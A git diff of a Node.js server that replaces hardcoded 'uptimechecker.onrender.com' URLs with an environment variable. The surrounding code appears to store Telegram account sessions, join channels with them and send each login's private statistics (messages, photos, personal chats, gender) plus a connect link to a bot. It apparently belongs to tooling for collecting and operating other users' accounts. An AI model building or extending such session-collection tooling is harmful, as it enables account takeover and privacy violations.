@@ -124,11 +124,11 @@ try {
       }
       await sleep(3000)
     }
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    await fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
     await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
   })
   schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
-    fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
     joinchannelForBufferClients();
   })
 } catch (error) {
@@ -285,7 +285,7 @@ app.post('/users', async (req, res, next) => {
   if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
     user['lastUpdated'] = new Date().toISOString().split('T')[0]
     await db.insertUser(user);
-    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\nhttps://uptimechecker.onrender.com/connectclient/${user.mobile}`)}`);
+    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
   } else {
     setActiveClientSetup(undefined)
     console.log("New Session Generated");
@@ -1769,7 +1769,7 @@ async function setNewClient(user, activeClientSetup) {
         console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
         // if (data.userName) {
         //   try {
-        //     await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${data.userName}`);
+        //     await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${data.userName}`);
         //   } catch (error) {
 
         //   }
@@ -1779,19 +1779,19 @@ async function setNewClient(user, activeClientSetup) {
     const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
     console.log("Updated the Client Successfully", updatedClient);
     await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/forward/updateclient/${clientId}`);
+    await fetchWithTimeout(`${process.env.uptimeChecker}/forward/updateclient/${clientId}`);
     await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
     console.log(activeClientSetup.clientId, " -  ", updatedClient)
     if (updatedClient?.userName) {
       try {
-        await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${updatedClient.userName}`);
+        await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${updatedClient.userName}`);
       } catch (error) {
         console.log(error);
       }
     }
     await setUserMap();
     try {
-      await fetchWithTimeout(`https://uptimechecker.onrender.com/refreshmap`);
+      await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);
     } catch (error) {
       console.log(error);
     }
